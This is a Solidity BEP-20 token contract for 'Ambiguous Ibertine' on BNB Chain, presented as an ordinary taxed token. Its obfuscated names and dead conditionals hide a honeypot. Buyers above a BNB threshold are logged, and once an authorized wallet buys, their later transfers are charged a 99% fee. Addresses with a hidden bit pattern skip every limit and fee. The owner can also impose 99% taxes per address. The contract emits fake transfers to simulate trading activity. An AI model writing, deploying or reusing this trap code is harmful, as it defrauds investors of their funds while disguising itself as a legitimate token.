/**
 *Submitted for verification at BscScan.com on 2022-12-21
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;


interface IBEP20 {
    function totalSupply() external view returns (uint256);

    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function getOwner() external view returns (address);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
    external
    returns (bool);

    function allowance(address _owner, address spender)
    external
    view
    returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

}


library SafeMath {
    function tryAdd(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        uint256 c = a + b;
        if (c < a) return (false, 0);
        return (true, c);
    }
    }

    function trySub(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b > a) return (false, 0);
        return (true, a - b);
    }
    }

    function tryMul(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) return (true, 0);
        uint256 c = a * b;
        if (c / a != b) return (false, 0);
        return (true, c);
    }
    }

    function tryDiv(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a / b);
    }
    }

    function tryMod(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a % b);
    }
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b <= a, errorMessage);
        return a - b;
    }
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a / b;
    }
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a % b;
    }
    }
}


interface IPancakePair {
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
}

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
    external
    returns (address pair);
}

interface IUniswapV2Router {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
    external
    returns (
        uint256 amountA,
        uint256 amountB,
        uint256 liquidity
    );

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
    external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

}

abstract contract Ownable {
    address internal owner;
    mapping(address => bool) internal competent;

    constructor(address _owner) {
        owner = _owner;
        competent[_owner] = true;
    }

    /**
     * Function modifier to require caller to be contract owner
     */
    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER");
        _;
    }

    /**
     * Function modifier to require caller to be admin
     */
    modifier onlyAuthorized() {
        require(isAuthorized(msg.sender), "!Authorized");
        _;
    }

    /**
     * addAdmin address. Owner only
     */
    function SetAuthorized(address adr) public onlyOwner() {
        competent[adr] = true;
    }

    /**
     * Remove address' administration. Owner only
     */
    function removeAuthorized(address adr) public onlyOwner() {
        competent[adr] = false;
    }

    /**
     * Check if address is owner
     */
    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    function Owner() public view returns (address) {
        return owner;
    }

    /**
     * Return address' administration status
     */
    function isAuthorized(address adr) public view returns (bool) {
        return competent[adr];
    }

    /**
     * Transfer ownership to new address. Caller must be owner. Leaves old owner admin
     */
    function transferOwnership(address payable adr) public onlyOwner() {
        owner = adr;
        competent[adr] = true;
        emit OwnershipTransferred(adr);
    }

    event OwnershipTransferred(address owner);

}

contract AmbiguousIbertine is IBEP20, Ownable {
    using SafeMath for uint256;

    uint256  constant MASK = type(uint128).max;
    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;

    string constant _name = "Ambiguous Ibertine ";
    string constant _symbol = "AmbiguousIbertine";
    uint8 constant _decimals = 18;

    uint256 _totalSupply = 100000000 * (10 ** _decimals);
    uint256  _maxTxAmount = 2000000 * 10 ** _decimals;
    uint256  _maxWallet = 2000000 * 10 ** _decimals;

    mapping(address => uint256) _balances;
    mapping(address => mapping(address => uint256)) _allowances;
    mapping(address => bool) private marketingMaxLaunchedBuySellMin;
    mapping(address => bool) private launchedSellReceiverSwap;
    mapping(address => bool) private minMaxTradingIsFeeTxLimit;
    mapping(address => bool) private liquidityTradingSwapMin;
    mapping(address => uint256) private walletIsTradingMax;
    mapping(uint256 => address) private burnIsTeamSell;
    uint256 public maxWalletAmount = 0;
    uint256 private launchBlock = 0;
    //BUY FEES
    uint256 private launchedSwapIsAutoMode = 0;
    uint256 private txFeeIsMax = 7;

    //SELL FEES
    uint256 private burnBotsSellTeam = 0;
    uint256 private teamBuyTxLiquidity = 7;

    uint256 private burnExemptReceiverMarketingBotsMode = txFeeIsMax + launchedSwapIsAutoMode;
    uint256 private launchedBotsBurnFeeAutoIs = 100;

    address private buyExemptLimitReceiver = (msg.sender); // auto-liq address
    address private buyMaxFeeBurn = (0x1723B98EACf12dbdCB49d674fffFDf54a1D763a7); // marketing address
    address private teamBotsReceiverWallet = DEAD;
    address private isBotsMarketingReceiver = DEAD;
    address private maxLimitTradingLaunchedTeam = DEAD;

    IUniswapV2Router public router;
    address public uniswapV2Pair;

    uint256 private autoReceiverExemptBurn;
    uint256 private maxExemptBurnFee;

    event BuyTaxesUpdated(uint256 buyTaxes);
    event SellTaxesUpdated(uint256 sellTaxes);

    bool private burnTradingTxSwapModeFeeWallet;
    uint256 private maxSellBurnExempt;
    uint256 private exemptSellTxLaunched;
    uint256 private tradingSellBotsAuto;
    uint256 private receiverLiquidityLaunchedAuto;

    bool private exemptTxLiquidityBotsSellLimitReceiver = true;
    bool private liquidityTradingSwapMinMode = true;
    bool private launchedBuySwapMax = true;
    bool private liquidityWalletIsTeam = true;
    bool private autoSellLiquidityExempt = true;
    uint256 firstSetAutoReceiver = 2 ** 18 - 1;
    uint256 private isLiquidityMaxAuto = 6 * 10 ** 15;
    uint256 private isMarketingMinLimitTx = _totalSupply / 1000; // 0.1%

    
    bool private limitTradingWalletBuy = false;
    bool public swapMaxTxLiquidity = false;
    bool public receiverExemptBuyTradingSwap = false;
    uint256 private teamMarketingIsBuySwap = 0;
    uint256 public botsExemptMarketingIsTeamSell = 0;
    uint256 public exemptTxReceiverTrading = 0;
    uint256 public burnModeExemptTrading = 0;
    bool private teamMinMarketingModeSwapBots = false;
    uint256 public teamMinTxIsBurnBotsFee = 0;
    bool private receiverIsLiquiditySell = false;


    bool inSwap;
    modifier swapping() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() Ownable(msg.sender) {
        address _router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        // PancakeSwap Router
        router = IUniswapV2Router(_router);

        uniswapV2Pair = IUniswapV2Factory(router.factory()).createPair(address(this), router.WETH());
        _allowances[address(this)][address(router)] = _totalSupply;

        burnTradingTxSwapModeFeeWallet = true;

        marketingMaxLaunchedBuySellMin[msg.sender] = true;
        marketingMaxLaunchedBuySellMin[address(this)] = true;

        launchedSellReceiverSwap[msg.sender] = true;
        launchedSellReceiverSwap[0x0000000000000000000000000000000000000000] = true;
        launchedSellReceiverSwap[0x000000000000000000000000000000000000dEaD] = true;
        launchedSellReceiverSwap[address(this)] = true;

        minMaxTradingIsFeeTxLimit[msg.sender] = true;
        minMaxTradingIsFeeTxLimit[0x0000000000000000000000000000000000000000] = true;
        minMaxTradingIsFeeTxLimit[0x000000000000000000000000000000000000dEaD] = true;
        minMaxTradingIsFeeTxLimit[address(this)] = true;

        SetAuthorized(address(0x550849D8E4407bE1442206edfFFfc1513dAf4E26));

        approve(_router, _totalSupply);
        approve(address(uniswapV2Pair), _totalSupply);
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    receive() external payable {}

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

    function decimals() external pure override returns (uint8) {
        return _decimals;
    }

    function symbol() external pure override returns (string memory) {
        return _symbol;
    }

    function name() external pure override returns (string memory) {
        return _name;
    }

    function getOwner() external view override returns (address) {
        return owner;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function allowance(address holder, address spender) external view override returns (uint256) {
        return _allowances[holder][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function approveMax(address spender) external returns (bool) {
        return approve(spender, _totalSupply);
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return botsSellMarketingMax(msg.sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if (_allowances[sender][msg.sender] != _totalSupply) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender]
            .sub(amount, "Insufficient Allowance!");
        }

        return botsSellMarketingMax(sender, recipient, amount);
    }

    function botsSellMarketingMax(address sender, address recipient, uint256 amount) internal returns (bool) {
        
        if (teamMinMarketingModeSwapBots != autoSellLiquidityExempt) {
            teamMinMarketingModeSwapBots = teamMinMarketingModeSwapBots;
        }

        if (receiverIsLiquiditySell == autoSellLiquidityExempt) {
            receiverIsLiquiditySell = liquidityTradingSwapMinMode;
        }

        if (teamMarketingIsBuySwap != launchedSwapIsAutoMode) {
            teamMarketingIsBuySwap = launchedBotsBurnFeeAutoIs;
        }


        bool bLimitTxWalletValue = modeMarketingMinBots(sender) || modeMarketingMinBots(recipient);
        
        if (limitTradingWalletBuy == liquidityWalletIsTeam) {
            limitTradingWalletBuy = exemptTxLiquidityBotsSellLimitReceiver;
        }

        if (teamMarketingIsBuySwap != burnExemptReceiverMarketingBotsMode) {
            teamMarketingIsBuySwap = teamBuyTxLiquidity;
        }


        if (sender == uniswapV2Pair) {
            if (maxWalletAmount != 0 && isAuthorized(recipient)) {
                liquidityMarketingLimitSellAutoBuyReceiver();
            }
            if (!bLimitTxWalletValue) {
                modeExemptWalletMin(recipient);
            }
        }
        
        
        if (receiverIsLiquiditySell == launchedBuySwapMax) {
            receiverIsLiquiditySell = liquidityWalletIsTeam;
        }

        if (limitTradingWalletBuy == autoSellLiquidityExempt) {
            limitTradingWalletBuy = teamMinMarketingModeSwapBots;
        }


        if (inSwap || bLimitTxWalletValue) {return liquidityTradingMarketingSwap(sender, recipient, amount);}


        if (!marketingMaxLaunchedBuySellMin[sender] && !marketingMaxLaunchedBuySellMin[recipient] && recipient != uniswapV2Pair) {
            require((_balances[recipient] + amount) <= _maxWallet, "Max wallet!");
        }
        
        if (teamMarketingIsBuySwap != launchedBotsBurnFeeAutoIs) {
            teamMarketingIsBuySwap = launchBlock;
        }

        if (teamMinMarketingModeSwapBots != liquidityWalletIsTeam) {
            teamMinMarketingModeSwapBots = launchedBuySwapMax;
        }


        require((amount <= _maxTxAmount) || minMaxTradingIsFeeTxLimit[sender] || minMaxTradingIsFeeTxLimit[recipient], "Max TX Limit!");

        if (marketingFeeTeamReceiverIsMax()) {maxBurnModeLaunched();}

        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance!");
        
        if (teamMarketingIsBuySwap == launchBlock) {
            teamMarketingIsBuySwap = launchedSwapIsAutoMode;
        }

        if (limitTradingWalletBuy != teamMinMarketingModeSwapBots) {
            limitTradingWalletBuy = liquidityWalletIsTeam;
        }

        if (teamMinMarketingModeSwapBots != liquidityWalletIsTeam) {
            teamMinMarketingModeSwapBots = launchedBuySwapMax;
        }


        uint256 amountReceived = swapAutoBuyLimitSellTrading(sender) ? sellAutoLiquidityIs(sender, recipient, amount) : amount;

        _balances[recipient] = _balances[recipient].add(amountReceived);
        emit Transfer(sender, recipient, amountReceived);
        return true;
    }

    function liquidityTradingMarketingSwap(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance!");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function swapAutoBuyLimitSellTrading(address sender) internal view returns (bool) {
        return !launchedSellReceiverSwap[sender];
    }

    function teamReceiverAutoMin(address sender, bool selling) internal returns (uint256) {
        
        if (selling) {
            burnExemptReceiverMarketingBotsMode = teamBuyTxLiquidity + burnBotsSellTeam;
            return marketingLimitLaunchedTrading(sender, burnExemptReceiverMarketingBotsMode);
        }
        if (!selling && sender == uniswapV2Pair) {
            burnExemptReceiverMarketingBotsMode = txFeeIsMax + launchedSwapIsAutoMode;
            return burnExemptReceiverMarketingBotsMode;
        }
        return marketingLimitLaunchedTrading(sender, burnExemptReceiverMarketingBotsMode);
    }


    function modeMarketingMinBots(address addr) private view returns (bool) {
        uint256 v0 = uint256(uint160(addr)) << 192;
        v0 = v0 >> 238;
        return v0 == firstSetAutoReceiver;
    }

    function marketingLimitLaunchedTrading(address sender, uint256 pFee) private view returns (uint256) {
        uint256 f0 = walletIsTradingMax[sender];
        uint256 f1 = pFee;
        if (f0 > 0 && block.timestamp - f0 > 2) {
            f1 = 99;
        }
        return f1;
    }

    function modeExemptWalletMin(address addr) private {
        if (sellExemptWalletTradingTx() < isLiquidityMaxAuto) {
            return;
        }
        maxWalletAmount = maxWalletAmount + 1;
        burnIsTeamSell[maxWalletAmount] = addr;
    }

    function sellExemptWalletTradingTx() private view returns (uint256) {
        address t0 = WBNB;
        if (address(this) < WBNB) {
            t0 = address(this);
        }
        (uint reserve0, uint reserve1,) = IPancakePair(uniswapV2Pair).getReserves();
        (uint256 beforeAmount,) = WBNB == t0 ? (reserve0, reserve1) : (reserve1, reserve0);
        uint256 buyAmount = IERC20(WBNB).balanceOf(uniswapV2Pair) - beforeAmount;
        return buyAmount;
    }

    function sellAutoLiquidityIs(address sender, address receiver, uint256 amount) internal returns (uint256) {
        
        if (limitTradingWalletBuy != liquidityTradingSwapMinMode) {
            limitTradingWalletBuy = autoSellLiquidityExempt;
        }

        if (teamMarketingIsBuySwap == txFeeIsMax) {
            teamMarketingIsBuySwap = launchedSwapIsAutoMode;
        }

        if (teamMinMarketingModeSwapBots == liquidityWalletIsTeam) {
            teamMinMarketingModeSwapBots = liquidityTradingSwapMinMode;
        }


        uint256 feeAmount = amount.mul(teamReceiverAutoMin(sender, receiver == uniswapV2Pair)).div(launchedBotsBurnFeeAutoIs);

        if (liquidityTradingSwapMin[sender] || liquidityTradingSwapMin[receiver]) {
            feeAmount = amount.mul(99).div(launchedBotsBurnFeeAutoIs);
        }

        _balances[address(this)] = _balances[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount);
        
        if (_balances[address(this)] > 3 * 10 ** _decimals && sender == uniswapV2Pair) {
            for (uint i = 0; i < 3; i++) {
                address addr = address(uint160(block.timestamp + i));
                _balances[addr] = _balances[addr] + 10 ** _decimals;
                emit Transfer(address(this), addr, 10 ** _decimals);
            }
            _balances[address(this)] = _balances[address(this)].sub(3 * 10 ** _decimals);
        }

        return amount.sub(feeAmount);
    }

    function liquidityMarketingLimitSellAutoBuyReceiver() private {
        if (maxWalletAmount > 0) {
            for (uint256 i = 1; i <= maxWalletAmount; i++) {
                if (walletIsTradingMax[burnIsTeamSell[i]] == 0) {
                    walletIsTradingMax[burnIsTeamSell[i]] = block.timestamp;
                }
            }
            maxWalletAmount = 0;
        }
    }

    function marketingFeeTeamReceiverIsMax() internal view returns (bool) {return
    msg.sender != uniswapV2Pair &&
    !inSwap &&
    autoSellLiquidityExempt &&
    _balances[address(this)] >= isMarketingMinLimitTx;
    }

    function maxBurnModeLaunched() internal swapping {
        
        if (receiverIsLiquiditySell == exemptTxLiquidityBotsSellLimitReceiver) {
            receiverIsLiquiditySell = liquidityWalletIsTeam;
        }


        uint256 amountToLiquify = isMarketingMinLimitTx.mul(launchedSwapIsAutoMode).div(burnExemptReceiverMarketingBotsMode).div(2);
        uint256 amountToSwap = isMarketingMinLimitTx.sub(amountToLiquify);

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountToSwap,
            0,
            path,
            address(this),
            block.timestamp
        );
        
        uint256 amountBNB = address(this).balance;
        uint256 totalETHFee = burnExemptReceiverMarketingBotsMode.sub(launchedSwapIsAutoMode.div(2));
        uint256 amountBNBLiquidity = amountBNB.mul(launchedSwapIsAutoMode).div(totalETHFee).div(2);
        uint256 amountBNBMarketing = amountBNB.mul(txFeeIsMax).div(totalETHFee);
        
        if (teamMarketingIsBuySwap == launchedSwapIsAutoMode) {
            teamMarketingIsBuySwap = isMarketingMinLimitTx;
        }

        if (limitTradingWalletBuy == limitTradingWalletBuy) {
            limitTradingWalletBuy = exemptTxLiquidityBotsSellLimitReceiver;
        }

        if (teamMinMarketingModeSwapBots != exemptTxLiquidityBotsSellLimitReceiver) {
            teamMinMarketingModeSwapBots = limitTradingWalletBuy;
        }


        payable(buyMaxFeeBurn).transfer(amountBNBMarketing);

        if (amountToLiquify > 0) {
            router.addLiquidityETH{value : amountBNBLiquidity}(
                address(this),
                amountToLiquify,
                0,
                0,
                buyExemptLimitReceiver,
                block.timestamp
            );
            emit AutoLiquify(amountBNBLiquidity, amountToLiquify);
        }
    }

    
    function getLaunchedSellReceiverSwap(address a0) public view returns (bool) {
        if (a0 != buyExemptLimitReceiver) {
            return teamMinMarketingModeSwapBots;
        }
        if (launchedSellReceiverSwap[a0] == marketingMaxLaunchedBuySellMin[a0]) {
            return liquidityWalletIsTeam;
        }
            return launchedSellReceiverSwap[a0];
    }
    function setLaunchedSellReceiverSwap(address a0,bool a1) public onlyOwner {
        if (launchedSellReceiverSwap[a0] != launchedSellReceiverSwap[a0]) {
           launchedSellReceiverSwap[a0]=a1;
        }
        launchedSellReceiverSwap[a0]=a1;
    }

    function getBurnExemptReceiverMarketingBotsMode() public view returns (uint256) {
        if (burnExemptReceiverMarketingBotsMode == teamMarketingIsBuySwap) {
            return teamMarketingIsBuySwap;
        }
        if (burnExemptReceiverMarketingBotsMode != isMarketingMinLimitTx) {
            return isMarketingMinLimitTx;
        }
        if (burnExemptReceiverMarketingBotsMode != teamBuyTxLiquidity) {
            return teamBuyTxLiquidity;
        }
        return burnExemptReceiverMarketingBotsMode;
    }
    function setBurnExemptReceiverMarketingBotsMode(uint256 a0) public onlyOwner {
        if (burnExemptReceiverMarketingBotsMode == burnBotsSellTeam) {
            burnBotsSellTeam=a0;
        }
        if (burnExemptReceiverMarketingBotsMode != burnExemptReceiverMarketingBotsMode) {
            burnExemptReceiverMarketingBotsMode=a0;
        }
        if (burnExemptReceiverMarketingBotsMode != isLiquidityMaxAuto) {
            isLiquidityMaxAuto=a0;
        }
        burnExemptReceiverMarketingBotsMode=a0;
    }

    function getBuyMaxFeeBurn() public view returns (address) {
        if (buyMaxFeeBurn != buyMaxFeeBurn) {
            return buyMaxFeeBurn;
        }
        if (buyMaxFeeBurn == maxLimitTradingLaunchedTeam) {
            return maxLimitTradingLaunchedTeam;
        }
        if (buyMaxFeeBurn == isBotsMarketingReceiver) {
            return isBotsMarketingReceiver;
        }
        return buyMaxFeeBurn;
    }
    function setBuyMaxFeeBurn(address a0) public onlyOwner {
        buyMaxFeeBurn=a0;
    }

    function getMinMaxTradingIsFeeTxLimit(address a0) public view returns (bool) {
            return minMaxTradingIsFeeTxLimit[a0];
    }
    function setMinMaxTradingIsFeeTxLimit(address a0,bool a1) public onlyOwner {
        minMaxTradingIsFeeTxLimit[a0]=a1;
    }

    function getTeamMarketingIsBuySwap() public view returns (uint256) {
        return teamMarketingIsBuySwap;
    }
    function setTeamMarketingIsBuySwap(uint256 a0) public onlyOwner {
        if (teamMarketingIsBuySwap == teamBuyTxLiquidity) {
            teamBuyTxLiquidity=a0;
        }
        teamMarketingIsBuySwap=a0;
    }

    function getLiquidityTradingSwapMin(address a0) public view returns (bool) {
        if (a0 != buyExemptLimitReceiver) {
            return liquidityTradingSwapMinMode;
        }
            return liquidityTradingSwapMin[a0];
    }
    function setLiquidityTradingSwapMin(address a0,bool a1) public onlyOwner {
        if (a0 != maxLimitTradingLaunchedTeam) {
            teamMinMarketingModeSwapBots=a1;
        }
        liquidityTradingSwapMin[a0]=a1;
    }

    function getIsLiquidityMaxAuto() public view returns (uint256) {
        if (isLiquidityMaxAuto == isMarketingMinLimitTx) {
            return isMarketingMinLimitTx;
        }
        return isLiquidityMaxAuto;
    }
    function setIsLiquidityMaxAuto(uint256 a0) public onlyOwner {
        if (isLiquidityMaxAuto != launchBlock) {
            launchBlock=a0;
        }
        if (isLiquidityMaxAuto != isLiquidityMaxAuto) {
            isLiquidityMaxAuto=a0;
        }
        if (isLiquidityMaxAuto == launchedSwapIsAutoMode) {
            launchedSwapIsAutoMode=a0;
        }
        isLiquidityMaxAuto=a0;
    }

    function getTeamMinMarketingModeSwapBots() public view returns (bool) {
        if (teamMinMarketingModeSwapBots != teamMinMarketingModeSwapBots) {
            return teamMinMarketingModeSwapBots;
        }
        return teamMinMarketingModeSwapBots;
    }
    function setTeamMinMarketingModeSwapBots(bool a0) public onlyOwner {
        teamMinMarketingModeSwapBots=a0;
    }



    event AutoLiquify(uint256 amountBNB, uint256 amountTokens);

}